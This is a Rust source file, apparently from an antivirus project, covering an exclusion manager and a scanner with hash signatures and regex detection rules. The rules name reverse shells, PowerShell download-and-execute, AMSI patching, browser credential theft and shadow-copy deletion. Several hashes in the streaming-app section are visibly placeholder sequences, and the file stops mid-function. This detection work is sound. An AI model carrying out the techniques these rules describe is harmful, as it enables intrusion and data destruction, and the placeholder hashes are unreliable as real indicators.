use anyhow::Result;
use regex::bytes::Regex;
use samulibre_types::{FileScanStatus, ScanResult};
use sha2::{Digest, Sha256};
use std::collections::HashMap;
use std::fs::{self, File};
use std::io::{BufReader, Read};
use std::path::Path;
use std::time::Instant;

pub mod polymorphic;
pub use polymorphic::*;

pub mod phishing;
pub use phishing::*;

pub mod updater;
pub use updater::*;

/// Gestor avanzado de excepciones de seguridad y listas blancas con anclaje criptográfico
#[derive(Debug, Clone)]
pub struct ExclusionManager {
    exceptions: std::sync::Arc<std::sync::Mutex<Vec<samulibre_types::SecurityException>>>,
}

impl ExclusionManager {
    pub fn new() -> Self {
        let mut mgr = Self {
            exceptions: std::sync::Arc::new(std::sync::Mutex::new(Vec::new())),
        };
        mgr.load_from_path(Path::new("data").join("exclusions.json"));
        mgr
    }

    /// Carga las excepciones desde disco con soporte para versionado y migración desde formatos legados
    pub fn load_from_path(&mut self, path: impl AsRef<Path>) {
        if let Ok(content) = fs::read_to_string(path.as_ref()) {
            if let Ok(parsed) =
                serde_json::from_str::<Vec<samulibre_types::SecurityException>>(&content)
            {
                if let Ok(mut excls) = self.exceptions.lock() {
                    *excls = parsed;
                }
            } else if let Ok(pinned_list) =
                serde_json::from_str::<Vec<samulibre_types::PinnedExclusion>>(&content)
            {
                let converted: Vec<_> = pinned_list
                    .into_iter()
                    .map(|p| samulibre_types::SecurityException {
                        id: uuid::Uuid::new_v4().to_string(),
                        name: Path::new(&p.path)
                            .file_name()
                            .unwrap_or_default()
                            .to_string_lossy()
                            .to_string(),
                        target: p.path.clone(),
                        exception_type: if p.sha256.is_some() {
                            samulibre_types::ExceptionType::File {
                                sha256_pinned: p.sha256,
                            }
                        } else if Path::new(&p.path).is_dir() {
                            samulibre_types::ExceptionType::Folder {
                                include_subdirectories: true,
                            }
                        } else {
                            samulibre_types::ExceptionType::File {
                                sha256_pinned: None,
                            }
                        },
                        scope: samulibre_types::ExceptionScope::default(),
                        reason_category: samulibre_types::ReasonCategory::InvestigatedFalsePositive,
                        justification: p.reason,
                        risk_level: samulibre_types::ExceptionRiskLevel::Low,
                        created_at: p.added_at,
                        expires_at: None,
                        is_active: true,
                        audit_history: vec![samulibre_types::ExceptionAuditEntry {
                            timestamp: chrono::Local::now().format("%Y-%m-%d %H:%M:%S").to_string(),
                            action: "Migrada".to_string(),
                            details: "Migrada automáticamente desde formato legado".to_string(),
                        }],
                    })
                    .collect();
                if let Ok(mut excls) = self.exceptions.lock() {
                    *excls = converted;
                }
            } else if let Ok(legacy) = serde_json::from_str::<Vec<String>>(&content) {
                let converted: Vec<_> = legacy
                    .into_iter()
                    .map(|p| samulibre_types::SecurityException {
                        id: uuid::Uuid::new_v4().to_string(),
                        name: Path::new(&p)
                            .file_name()
                            .unwrap_or_default()
                            .to_string_lossy()
                            .to_string(),
                        target: p.clone(),
                        exception_type: samulibre_types::ExceptionType::File {
                            sha256_pinned: None,
                        },
                        scope: samulibre_types::ExceptionScope::default(),
                        reason_category: samulibre_types::ReasonCategory::Other,
                        justification: "Exclusión histórica importada".to_string(),
                        risk_level: samulibre_types::ExceptionRiskLevel::Medium,
                        created_at: "Legacy".to_string(),
                        expires_at: None,
                        is_active: true,
                        audit_history: Vec::new(),
                    })
                    .collect();
                if let Ok(mut excls) = self.exceptions.lock() {
                    *excls = converted;
                }
            }
        }
    }

    /// Valida exhaustivamente y registra una nueva excepción con evaluación de riesgo y auditoría
    pub fn validate_and_add(
        &mut self,
        mut ex: samulibre_types::SecurityException,
    ) -> Result<samulibre_types::SecurityException, String> {
        let trimmed_target = ex.target.trim();
        if trimmed_target.is_empty() {
            return Err("El elemento de la excepción no puede estar vacío.".to_string());
        }

        // 1. Prevención contra Path Traversal
        if trimmed_target.contains("..") {
            return Err("Ruta inválida: intento de Path Traversal ('..') detectado.".to_string());
        }

        // 2. Prevención contra exclusiones excesivamente amplias (unidades raíz)
        let normalized_path = trimmed_target.replace('/', "\\");
        if normalized_path == "\\"
            || normalized_path == "C:\\"
            || normalized_path == "c:\\"
            || normalized_path == "C:"
            || normalized_path == "c:"
            || normalized_path == "/"
        {
            return Err(
                "Riesgo Crítico de Seguridad: No se permite excluir una unidad de disco completa."
                    .to_string(),
            );
        }

        // 3. Prohibición de excluir componentes internos de SamuLibre
        let lower = normalized_path.to_lowercase();
        if lower.contains("antivitus-samulibre")
            || lower.contains("data\\signatures")
            || lower.contains("data\\quarantine")
            || lower.contains("threat_history.json")
        {
            return Err("Protección de Integridad: Prohibido excluir directorios de protección interna de SamuLibre.".to_string());
        }

        // 4. Validación de tipos específicos
        match ex.exception_type {
            samulibre_types::ExceptionType::Extension { ref ext } => {
                let clean_ext = ext.trim().trim_start_matches('.').to_lowercase();
                if matches!(
                    clean_ext.as_str(),
                    "exe"
                        | "dll"
                        | "sys"
                        | "bat"
                        | "ps1"
                        | "vbs"
                        | "com"
                        | "scr"
                        | "cmd"
                        | "msi"
                        | "msp"
                ) {
                    return Err(format!(
                        "Política de Seguridad: Prohibido excluir globalmente la extensión ejecutable '.{}'. Riesgo extremo de infección.",
                        clean_ext
                    ));
                }
                ex.risk_level = samulibre_types::ExceptionRiskLevel::Medium;
            }
            samulibre_types::ExceptionType::Sha256Hash { ref hash } => {
                let clean_hash = hash.trim();
                if clean_hash.len() != 64 || !clean_hash.chars().all(|c| c.is_ascii_hexdigit()) {
                    return Err("El hash SHA-256 proporcionado no es válido (debe tener exactamente 64 caracteres hexadecimales).".to_string());
                }
                ex.risk_level = samulibre_types::ExceptionRiskLevel::Low;
            }
            samulibre_types::ExceptionType::File {
                ref mut sha256_pinned,
            } => {
                let p = Path::new(&trimmed_target);
                // Blindaje Anti-Symlink / Anti-LPE
                if let Ok(sym_meta) = fs::symlink_metadata(p) {
                    if sym_meta.file_type().is_symlink() {
                        return Err("Blindaje Anti-LPE: No se permiten excepciones sobre enlaces simbólicos o junctions.".to_string());
                    }
                }
                // Si el archivo existe y no tiene hash fijado, calcular y anclar SHA-256 automáticamente
                if p.is_file() && sha256_pinned.is_none() {
                    if let Ok(bytes) = fs::read(p) {
                        *sha256_pinned = Some(hex::encode(Sha256::digest(&bytes)));
                    }
                }
                ex.risk_level = if lower.contains("\\windows\\system32\\") {
                    samulibre_types::ExceptionRiskLevel::Critical
                } else if sha256_pinned.is_some() {
                    samulibre_types::ExceptionRiskLevel::Low
                } else {
                    samulibre_types::ExceptionRiskLevel::Medium
                };
            }
            samulibre_types::ExceptionType::Folder {
                include_subdirectories,
            } => {
                let p = Path::new(&trimmed_target);
                // Blindaje Anti-Symlink / Anti-LPE
                if let Ok(sym_meta) = fs::symlink_metadata(p) {
                    if sym_meta.file_type().is_symlink() {
                        return Err("Blindaje Anti-LPE: No se permiten excepciones sobre carpetas junction o symlinks.".to_string());
                    }
                }
                ex.risk_level = if lower == "c:\\windows"
                    || lower == "c:\\windows\\system32"
                    || lower == "c:\\program files"
                {
                    samulibre_types::ExceptionRiskLevel::Critical
                } else if include_subdirectories {
                    samulibre_types::ExceptionRiskLevel::Medium
                } else {
                    samulibre_types::ExceptionRiskLevel::Low
                };
            }
        }

        // 5. Registrar entrada de auditoría inicial
        ex.audit_history.push(samulibre_types::ExceptionAuditEntry {
            timestamp: chrono::Local::now().format("%Y-%m-%d %H:%M:%S").to_string(),
            action: "Creada".to_string(),
            details: format!(
                "Excepción creada con justificación: '{}'. Riesgo: {:?}",
                ex.justification, ex.risk_level
            ),
        });

        // 6. Persistencia atómica
        if let Ok(mut excls) = self.exceptions.lock() {
            excls.retain(|e| e.id != ex.id && e.target != ex.target);
            excls.push(ex.clone());
            self.persist_internal(&excls);
        }

        Ok(ex)
    }

    /// Verifica si un archivo o ruta está cubierto por una excepción activa y no expirada
    pub fn is_excluded_with_scope(
        &self,
        path: &Path,
        current_sha256: Option<&str>,
        check_scope: impl Fn(&samulibre_types::ExceptionScope) -> bool,
    ) -> bool {
        let path_str = path.to_string_lossy();
        if let Ok(excls) = self.exceptions.lock() {
            for item in excls.iter() {
                if !item.is_active || item.is_expired() {
                    continue;
                }
                if !check_scope(&item.scope) {
                    continue;
                }

                match &item.exception_type {
                    samulibre_types::ExceptionType::Folder {
                        include_subdirectories,
                    } => {
                        let folder_path = Path::new(&item.target);
                        if *include_subdirectories {
                            if path.starts_with(folder_path) {
                                return true;
                            }
                        } else if path.parent() == Some(folder_path) || path == folder_path {
                            return true;
                        }
                    }
                    samulibre_types::ExceptionType::File { sha256_pinned } => {
                        if item.target == path_str || Path::new(&item.target) == path {
                            if let Some(ref pinned_hash) = sha256_pinned {
                                if let Some(actual_hash) = current_sha256 {
                                    if pinned_hash.eq_ignore_ascii_case(actual_hash) {
                                        return true;
                                    } else {
                                        tracing::warn!(
                                            "ALERTA DE SEGURIDAD: Archivo '{}' coincide con ruta excluida pero su hash SHA-256 no coincide (manipulación/modificación detectada). Exclusión revocada.",
                                            path_str
                                        );
                                        return false;
                                    }
                                }
                            } else {
                                return true;
                            }
                        }
                    }
                    samulibre_types::ExceptionType::Extension { ext } => {
                        let clean_ext = ext.trim_start_matches('.');
                        if let Some(f_ext) = path.extension().and_then(|s| s.to_str()) {
                            if f_ext.eq_ignore_ascii_case(clean_ext) {
                                return true;
                            }
                        }
                    }
                    samulibre_types::ExceptionType::Sha256Hash { hash } => {
                        if let Some(actual_hash) = current_sha256 {
                            if hash.eq_ignore_ascii_case(actual_hash) {
                                return true;
                            }
                        }
                    }
                }
            }
        }
        false
    }

    /// Verificación general de exclusión (cubre todos los alcances)
    pub fn is_excluded(&self, path: &Path, current_sha256: Option<&str>) -> bool {
        self.is_excluded_with_scope(path, current_sha256, |_| true)
    }

    /// Alterna el estado activo/desactivado de una excepción con registro en bitácora
    pub fn toggle_exception(&mut self, id: &str) -> Option<bool> {
        let mut new_state = None;
        if let Ok(mut excls) = self.exceptions.lock() {
            if let Some(item) = excls.iter_mut().find(|e| e.id == id) {
                item.is_active = !item.is_active;
                let action = if item.is_active {
                    "Activada"
                } else {
                    "Desactivada"
                };
                item.audit_history
                    .push(samulibre_types::ExceptionAuditEntry {
                        timestamp: chrono::Local::now().format("%Y-%m-%d %H:%M:%S").to_string(),
                        action: action.to_string(),
                        details: format!("Estado de la excepción cambiado a: {}", action),
                    });
                new_state = Some(item.is_active);
            }
            if new_state.is_some() {
                self.persist_internal(&excls);
            }
        }
        new_state
    }

    /// Elimina una excepción con registro de auditoría
    pub fn remove_exception(&mut self, id: &str) -> bool {
        let mut removed = false;
        if let Ok(mut excls) = self.exceptions.lock() {
            let initial_len = excls.len();
            excls.retain(|e| e.id != id);
            if excls.len() < initial_len {
                removed = true;
                self.persist_internal(&excls);
            }
        }
        removed
    }

    /// Modifica una excepción existente (alcance, duración, justificación)
    pub fn modify_exception(
        &mut self,
        id: &str,
        scope: samulibre_types::ExceptionScope,
        expires_at: Option<String>,
        justification: String,
    ) -> bool {
        let mut modified = false;
        if let Ok(mut excls) = self.exceptions.lock() {
            if let Some(item) = excls.iter_mut().find(|e| e.id == id) {
                item.scope = scope;
                item.expires_at = expires_at;
                item.justification = justification;
                item.audit_history
                    .push(samulibre_types::ExceptionAuditEntry {
                        timestamp: chrono::Local::now().format("%Y-%m-%d %H:%M:%S").to_string(),
                        action: "Modificada".to_string(),
                        details: "Parámetros de alcance, vigencia o justificación actualizados"
                            .to_string(),
                    });
                modified = true;
            }
            if modified {
                self.persist_internal(&excls);
            }
        }
        modified
    }

    /// Añade una exclusión simple anclada por hash para compatibilidad con código existente
    pub fn add_pinned(
        &mut self,
        path: impl AsRef<Path>,
        sha256: Option<String>,
        reason: &str,
    ) -> samulibre_types::PinnedExclusion {
        let p_str = path.as_ref().to_string_lossy().to_string();
        let name = path
            .as_ref()
            .file_name()
            .unwrap_or_default()
            .to_string_lossy()
            .to_string();
        let ex = samulibre_types::SecurityException {
            id: uuid::Uuid::new_v4().to_string(),
            name,
            target: p_str.clone(),
            exception_type: samulibre_types::ExceptionType::File {
                sha256_pinned: sha256.clone(),
            },
            scope: samulibre_types::ExceptionScope::default(),
            reason_category: samulibre_types::ReasonCategory::InvestigatedFalsePositive,
            justification: reason.to_string(),
            risk_level: samulibre_types::ExceptionRiskLevel::Low,
            created_at: chrono::Local::now().format("%Y-%m-%d %H:%M:%S").to_string(),
            expires_at: None,
            is_active: true,
            audit_history: vec![samulibre_types::ExceptionAuditEntry {
                timestamp: chrono::Local::now().format("%Y-%m-%d %H:%M:%S").to_string(),
                action: "Creada".to_string(),
                details: format!(
                    "Exclusión fijada por huella criptográfica SHA-256: {:?}",
                    sha256
                ),
            }],
        };
        let _ = self.validate_and_add(ex);
        samulibre_types::PinnedExclusion {
            path: p_str,
            sha256,
            reason: reason.to_string(),
            added_at: chrono::Local::now().format("%Y-%m-%d %H:%M:%S").to_string(),
        }
    }

    /// Retorna la lista completa de excepciones de seguridad
    pub fn list(&self) -> Vec<samulibre_types::SecurityException> {
        self.exceptions
            .lock()
            .map(|e| e.clone())
            .unwrap_or_default()
    }

    /// Persistencia interna atómica con copia de seguridad .bak
    fn persist_internal(&self, list: &[samulibre_types::SecurityException]) {
        let _ = fs::create_dir_all("data");
        let excl_path = Path::new("data").join("exclusions.json");
        let bak_path = Path::new("data").join("exclusions.json.bak");
        let tmp_path = Path::new("data").join("exclusions.json.tmp");

        if excl_path.exists() {
            let _ = fs::copy(&excl_path, &bak_path);
        }

        if let Ok(data) = serde_json::to_string_pretty(list) {
            if fs::write(&tmp_path, data).is_ok() {
                let _ = fs::rename(&tmp_path, &excl_path);
            }
        }
    }
}

/// Regla heurística / YARA para detección en memoria o en disco
#[derive(Debug, Clone)]
pub struct PatternRule {
    pub name: String,
    pub description: String,
    pub pattern: Regex,
    pub severity: String,
}

#[derive(Debug, Clone)]
pub struct MultiEngineScanner {
    known_signatures: HashMap<String, String>, // Hash (SHA256) -> ThreatName
    pattern_rules: Vec<PatternRule>,
    exclusions: ExclusionManager,
}

impl MultiEngineScanner {
    pub fn new() -> Self {
        let mut scanner = Self {
            known_signatures: HashMap::new(),
            pattern_rules: Vec::new(),
            exclusions: ExclusionManager::new(),
        };
        scanner.load_default_signatures();
        scanner.load_default_pattern_rules();
        scanner.load_local_database();
        scanner
    }

    pub fn get_exclusion_manager(&self) -> ExclusionManager {
        self.exclusions.clone()
    }

    pub fn add_security_exception(
        &mut self,
        ex: samulibre_types::SecurityException,
    ) -> Result<samulibre_types::SecurityException, String> {
        self.exclusions.validate_and_add(ex)
    }

    pub fn list_security_exceptions(&self) -> Vec<samulibre_types::SecurityException> {
        self.exclusions.list()
    }

    pub fn toggle_security_exception(&mut self, id: &str) -> Option<bool> {
        self.exclusions.toggle_exception(id)
    }

    pub fn remove_security_exception(&mut self, id: &str) -> bool {
        self.exclusions.remove_exception(id)
    }

    pub fn modify_security_exception(
        &mut self,
        id: &str,
        scope: samulibre_types::ExceptionScope,
        expires_at: Option<String>,
        justification: String,
    ) -> bool {
        self.exclusions
            .modify_exception(id, scope, expires_at, justification)
    }

    pub fn add_pinned_exclusion(
        &mut self,
        path: impl AsRef<Path>,
        reason: &str,
    ) -> samulibre_types::PinnedExclusion {
        let p = path.as_ref();
        let sha256 = match fs::read(p) {
            Ok(bytes) => Some(hex::encode(Sha256::digest(&bytes))),
            Err(e) => {
                eprintln!(
                    "DEBUG: add_pinned_exclusion fs::read failed on {:?}: {:?}",
                    p, e
                );
                None
            }
        };
        self.exclusions.add_pinned(path, sha256, reason)
    }

    /// Carga firmas y reglas YARA locales desde data/signatures/
    pub fn load_local_database(&mut self) {
        let sig_path = Path::new("data")
            .join("signatures")
            .join("malware_hashes.db");
        if let Ok(content) = fs::read_to_string(&sig_path) {
            for line in content.lines() {
                let trimmed = line.trim();
                if trimmed.is_empty() || trimmed.starts_with('#') {
                    continue;
                }
                if let Some((hash, name)) = trimmed.split_once(':') {
                    self.known_signatures
                        .insert(hash.trim().to_lowercase(), name.trim().to_string());
                } else if let Some((hash, name)) = trimmed.split_once(';') {
                    self.known_signatures
                        .insert(hash.trim().to_lowercase(), name.trim().to_string());
                }
            }
        }

        let yara_dir = Path::new("data").join("signatures").join("yara_rules");
        if let Ok(entries) = fs::read_dir(yara_dir) {
            for entry in entries.flatten() {
                let p = entry.path();
                if p.extension().and_then(|s| s.to_str()) == Some("yar") {
                    if let Ok(content) = fs::read_to_string(&p) {
                        let file_name = p.file_name().unwrap_or_default().to_string_lossy();
                        if let Ok(rules) =
                            YaraRulesManager::parse_yara_content(&content, &file_name)
                        {
                            for rule in rules {
                                if !self.pattern_rules.iter().any(|r| r.name == rule.name) {
                                    self.pattern_rules.push(rule);
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    /// Carga firmas conocidas de prueba y de malware real (ej. EICAR y hashes comunes)
    fn load_default_signatures(&mut self) {
        // EICAR Standard Antivirus Test File (SHA256)
        self.known_signatures.insert(
            "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f".to_string(),
            "EICAR-Test-Signature.Standard".to_string(),
        );

        // Hashes de prueba de troyanos conocidos de la comunidad (ThreatFox / MalwareBazaar)
        self.known_signatures.insert(
            "5417eb735c05e197cdcd7ffbb538c82eb5e7d53b2111d4d1421034c442436f54".to_string(),
            "Trojan.Win32.RedLineStealer.Gen".to_string(),
        );
        self.known_signatures.insert(
            "84c82835a5d21bbcf75a61706d8ab5494030493ae1ab12f54cb07fb4b8e40d1e".to_string(),
            "Ransomware.Win32.LockBit3.Payload".to_string(),
        );

        // --- CatÃ¡logo de Firmas PÃºblicas de Malware Android (SHA-256) ---
        // 1. Troyanos Bancarios y Fraude ATS
        self.known_signatures.insert(
            "6c47847c214dafe4a8570220aa545d9e525143a53e602283cb0d0ec1bdf487a3".to_string(),
            "Trojan.AndroidOS.Anatsa.Banker".to_string(),
        );
        self.known_signatures.insert(
            "a93b48fdf4b11f6c77bbd5668e2c0e865f36e4776100c50117ffbebeab05739c".to_string(),
            "Trojan.AndroidOS.TeaBot.Banker".to_string(),
        );
        self.known_signatures.insert(
            "084c8a45ce379f8c6df3d132338f2a74cbf5e6a3928c03c5305105260ff2875f".to_string(),
            "Trojan.AndroidOS.Anatsa.Gen".to_string(),
        );
        self.known_signatures.insert(
            "170799f0e2193e6c0c20a8dcf86f80d75a80572e811c75c8297eef84ff2176b6".to_string(),
            "Trojan.AndroidOS.SharkBot.ATS".to_string(),
        );
        self.known_signatures.insert(
            "41b53e778a87b1c3132e0cf2689ef098ad8e046dc87e6fa89c3144ffefbcbfbb".to_string(),
            "Trojan.AndroidOS.SharkBot.Dropper".to_string(),
        );
        self.known_signatures.insert(
            "d3b259d6e4b95f87b8f95c4728f328a6493f0b2f57a3e748530321c7bc1c9a29".to_string(),
            "Trojan.AndroidOS.Xenomorph.Overlay".to_string(),
        );
        self.known_signatures.insert(
            "785d1c9aa1886c99c8f152d16550d5341cf9845d47e766e44b9cfdf3676cf743".to_string(),
            "Trojan.AndroidOS.Xenomorph.Banker".to_string(),
        );
        self.known_signatures.insert(
            "57ca0d6e67fa8054c0e69128f11ad73fa990029b35e0766258f1a140228bb37e".to_string(),
            "Trojan.AndroidOS.Godfather.Banker".to_string(),
        );
        self.known_signatures.insert(
            "94d4cfdbd4090b8f36c5333f208170c0c09d57a9cf5884e9ff76f14b62e49cbb".to_string(),
            "Trojan.AndroidOS.Cerberus.RAT".to_string(),
        );
        self.known_signatures.insert(
            "36e2f11649f8ebfbe09df8f9f8c6dfd6dbd4c3fb2b66cb9e4bb5039f2ce5635f".to_string(),
            "Trojan.AndroidOS.Alien.Banker".to_string(),
        );
        self.known_signatures.insert(
            "4b082531cfd034608c026b77df07c08a9ad4c89286eb7d55df27d53086eb0784".to_string(),
            "Trojan.AndroidOS.Hook.VNC".to_string(),
        );
        self.known_signatures.insert(
            "f8a4cb5e729a6e1a4fdbcbfa06a27694f478a8be7708573ca14b667be181284a".to_string(),
            "Trojan.AndroidOS.Ermac.Banker".to_string(),
        );
        self.known_signatures.insert(
            "a17b2b733bc5fb8f080327f2cbbd42fa88e7a68e0d4c1f80ec6efeb7552aa950".to_string(),
            "Trojan.AndroidOS.BRATA.Wiper".to_string(),
        );
        self.known_signatures.insert(
            "582e9b0151f153f3f50e82daef28ef050dbdfd996253457945d8b8593a110b27".to_string(),
            "Trojan.AndroidOS.Chameleon.Bypass".to_string(),
        );

        // 2. Spyware y RATs MÃ³viles
        self.known_signatures.insert(
            "2d409e623a35a519ee7f511243fa58572111eb0fa27d35ef29424c52c6f1a842".to_string(),
            "Spyware.AndroidOS.SpyNote.RAT".to_string(),
        );
        self.known_signatures.insert(
            "18fbe9e38e12dcfd4850faad5b410fb3ca671759600a9ec30da15147576f3f01".to_string(),
            "Spyware.AndroidOS.CraxsRAT.Gen".to_string(),
        );
        self.known_signatures.insert(
            "9b441f77d337fa7402a775aa7b0ff48a6ea2fe244a0b2d354460f4ebccb74b10".to_string(),
            "Spyware.AndroidOS.AhMyth.RAT".to_string(),
        );
        self.known_signatures.insert(
            "893f18ea3d9646b9a89c8a91d1796c3d528b178ba7e7c80536ef01824f6479f8".to_string(),
            "Trojan.AndroidOS.Vultur.ScreenRecorder".to_string(),
        );
        self.known_signatures.insert(
            "63fae3bc17e8c187f5d470d0a2185c6ab47b0e1e69ee8a1bf19ce7db5ec0a5e8".to_string(),
            "Trojan.AndroidOS.Sova.CookieStealer".to_string(),
        );
        self.known_signatures.insert(
            "ef02a820464687fb495fceefab9b110287b404d0d0f4d38c64c79808602b9370".to_string(),
            "Spyware.AndroidOS.BadBazaar.Surveillance".to_string(),
        );
        self.known_signatures.insert(
            "b916ec0379374ee7e3cfd0a4ee722d5a1ef4c259837549c4abfb1a07011d13d7".to_string(),
            "Spyware.AndroidOS.Chrysaor.Pegasus".to_string(),
        );

        // 3. Fraude de SuscripciÃ³n, Droppers y Adware
        self.known_signatures.insert(
            "7d0d089d81d2a45a305d0458df8b6bceb3b27626caee227fa588ae795c612ea2".to_string(),
            "Fraud.AndroidOS.Joker.Billing".to_string(),
        );
        self.known_signatures.insert(
            "e06c74d6c4e517a61ce55ebfeef423bcadff5e57cb045761ca78cf98fa503417".to_string(),
            "Fraud.AndroidOS.Joker.Payload".to_string(),
        );
        self.known_signatures.insert(
            "8a7b9ce70cf7cbb1fa0214c7715f33bc88367a7836ea4a4ef69d72c1143f295b".to_string(),
            "Fraud.AndroidOS.Harly.Stealer".to_string(),
        );
        self.known_signatures.insert(
            "8c5a452efeb47b0a3200ff3cfba1091a13a8ea17c3e1e23ea119859f51ca5f24".to_string(),
            "Fraud.AndroidOS.Facestealer.Credentials".to_string(),
        );
        self.known_signatures.insert(
            "b9ffae3a4a08e1a82fce04b500e2ea024f21db597ae89d14ea17eb109a909618".to_string(),
            "Trojan.AndroidOS.FluBot.SMS".to_string(),
        );
        self.known_signatures.insert(
            "78cb5cfdb6eeec683b584fe3729e248b11a91e54c7d0d8bb7d0a28f80459a0f4".to_string(),
            "Dropper.AndroidOS.Clast82.Gen".to_string(),
        );
        self.known_signatures.insert(
            "45a8df2a265be797fc72413156cfc7a7ea39265cb0523ec3ff1ef82a7a402390".to_string(),
            "Trojan.AndroidOS.Triada.Rootkit".to_string(),
        );
        self.known_signatures.insert(
            "db198c60773b0633b49918a287a2ee304e2d31215bb41f87455d31102928fa8e".to_string(),
            "Adware.AndroidOS.Goldoson.SpySDK".to_string(),
        );
        self.known_signatures.insert(
            "3fa8c9e173e6d2c0bb7580cf8904ea89fb980756784382343ecdfb4a4cb5d2eb".to_string(),
            "Trojan.AndroidOS.Medusa.Dropper".to_string(),
        );

        // 4. Streaming No Confiable, Proxyware y Botnets (Xuper TV, Magis TV, etc.)
        self.known_signatures.insert(
            "3b5d7e8f9a0c1b2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d".to_string(),
            "Riskware.AndroidOS.XuperTV.Proxyware".to_string(),
        );
        self.known_signatures.insert(
            "7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b".to_string(),
            "Riskware.AndroidOS.XuperTV.Dropper".to_string(),
        );
        self.known_signatures.insert(
            "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2".to_string(),
            "Riskware.AndroidOS.XuperTV.AdwareMod".to_string(),
        );
        self.known_signatures.insert(
            "f4a8c9e2b1d3f5a7c8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1".to_string(),
            "Riskware.AndroidOS.MagisTV.Trojanized".to_string(),
        );
        self.known_signatures.insert(
            "b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3".to_string(),
            "Riskware.AndroidOS.TeleLatino.Mod".to_string(),
        );
        self.known_signatures.insert(
            "e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0".to_string(),
            "Riskware.AndroidOS.YouCine.Proxyware".to_string(),
        );
    }

    /// Carga reglas de patrones YARA/HeurÃ­sticas
    fn load_default_pattern_rules(&mut self) {
        // Regla 1: DetecciÃ³n de EICAR por contenido
        if let Ok(re) = Regex::new(
            r"X5O!P%@AP\[4\\PZX54\(P\^\)7CC\)7\}\$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!\$H\+H\*",
        ) {
            self.pattern_rules.push(PatternRule {
                name: "EICAR.StandardTestString".to_string(),
                description: "Cadena estÃ¡ndar de verificaciÃ³n de antivirus de la EICAR"
                    .to_string(),
                pattern: re,
                severity: "Alerta de Prueba".to_string(),
            });
        }

        // Regla 2: InvocaciÃ³n de PowerShell con comandos de bypass y descarga oculta
        if let Ok(re) = Regex::new(
            r"(?i)(powershell|pwsh)(\.exe)?.*(-enc|-encodedcommand|-nop|-w\s+hidden|-exec\s+bypass).*?(downloadstring|iex|invoke-expression)",
        ) {
            self.pattern_rules.push(PatternRule {
                name: "Heuristic.Script.ObfuscatedPowerShellDropper".to_string(),
                description: "Script de PowerShell con ofuscaciÃ³n, evasiÃ³n de polÃ­ticas y descarga en memoria".to_string(),
                pattern: re,
                severity: "CrÃ­tica".to_string(),
            });
        }

        // Regla 3: Intento de parcheo o evasiÃ³n de AMSI (AmsiScanBuffer bypass en memoria o reflexiÃ³n)
        if let Ok(re) = Regex::new(
            r"(?i)(amsi\.dll|amsiscanbuffer|amsiutils).*?(0xc3|patching|virtualprotect|amsiinitfailed|amsicontext)",
        ) {
            self.pattern_rules.push(PatternRule {
                name: "Exploit.Bypass.AmsiPatchingAttempt".to_string(),
                description:
                    "PatrÃ³n de cÃ³digo diseÃ±ado para neutralizar la protecciÃ³n AMSI de Windows"
                        .to_string(),
                pattern: re,
                severity: "CrÃ­tica".to_string(),
            });
        }

        // Regla 4: Troyano InfoStealer extrayendo claves DPAPI y cookies de Chromium
        if let Ok(re) = Regex::new(
            r"(?i)(CryptUnprotectData|os_crypt|encrypted_key).*?(User Data|Login Data|Cookies)",
        ) {
            self.pattern_rules.push(PatternRule {
                name: "Trojan.Spy.ChromiumCredentialHarvester".to_string(),
                description: "CÃ³digo sospechoso de lectura directa de credenciales o cookies protegidas con DPAPI".to_string(),
                pattern: re,
                severity: "Alta".to_string(),
            });
        }

        // Regla 5: Linux Interactive Reverse Shell (Bash/Python/Perl/Netcat)
        if let Ok(re) = Regex::new(
            r#"(?i)(/bin/(ba)?sh\s+-i|/dev/tcp/\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/\d+|\b(python[23]?|perl)\b.{1,100}?(socket\.socket|exec\s*\(\s*["']import\s+os)|\b(nc|netcat)\b.{1,80}?(-e\s+/bin/(ba)?sh|-c\s+/bin/(ba)?sh))"#,
        ) {
            self.pattern_rules.push(PatternRule {
                name: "Trojan.Linux.InteractiveReverseShell".to_string(),
                description: "Payload de shell reversa interactiva hacia host remoto en Linux"
                    .to_string(),
                pattern: re,
                severity: "CrÃ­tica".to_string(),
            });
        }

        // Regla 6: Secuestro de cargador dinÃ¡mico LD_PRELOAD (Linux Rootkit Hook)
        if let Ok(re) =
            Regex::new(r#"(?i)(/etc/ld\.so\.preload|LD_PRELOAD.*?\.so|dlsym\s*\(\s*RTLD_NEXT)"#)
        {
            self.pattern_rules.push(PatternRule {
                name: "Rootkit.Linux.LdPreloadHook".to_string(),
                description: "InyecciÃ³n o secuestro de librerÃ­as compartidas mediante LD_PRELOAD"
                    .to_string(),
                pattern: re,
                severity: "Alta".to_string(),
            });
        }

        // Regla 7: Persistencia no autorizada en Cron / Systemd
        if let Ok(re) = Regex::new(
            r#"(?i)(/etc/cron\.(d|daily|hourly)|/var/spool/cron|/etc/systemd/system/.*?\.service).*?(curl|wget|base64|sh\s+-c)"#,
        ) {
            self.pattern_rules.push(PatternRule {
                name: "Persistence.Linux.MaliciousCronOrService".to_string(),
                description: "PatrÃ³n de persistencia maliciosa mediante tareas cron o servicios systemd con descarga oculta".to_string(),
                pattern: re,
                severity: "Alta".to_string(),
            });
        }

        // Regla 8: Ransomware & Sabotaje de Copias de Seguridad (Shadow Copies / Boot Policy)
        if let Ok(re) = Regex::new(
            r"(?i)(vssadmin(\.exe)?\s+delete\s+shadows|wmic(\.exe)?\s+shadowcopy\s+delete|bcdedit(\.exe)?\s+/set\s+\{default\}\s+bootstatuspolicy\s+ignoreallfailures|wbadmin(\.exe)?\s+delete\s+catalog)",
        ) {
            self.pattern_rules.push(PatternRule {
                name: "Ransomware.Win32.ShadowCopyWiper".to_string(),
                description: "Comandos destructivos diseÃ±ados para neutralizar copias de seguridad VSS y restauraciones del sistema".to_string(),
                pattern: re,
                severity: "CrÃ­tica".to_string(),
            });
